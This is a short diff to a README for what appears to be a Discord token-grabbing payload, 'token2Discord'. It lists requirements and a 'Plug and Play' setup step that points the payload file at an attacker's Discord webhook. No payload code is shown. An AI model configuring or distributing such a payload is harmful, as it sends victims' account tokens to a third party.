@@ -9,9 +9,9 @@ The user, YOU, are responsible for the usage of such utility. With that said, us
 1. Python3 (optional if building your own payload)
 2. Discord Webhook
 ```
-
 # Setup
 ```
+# Plug and Play!!
 # edit token2Discord.txt
 Input your discord webhook in the payload file (txt file)
 $webhook = 'DISCORD_WEBHOOK'
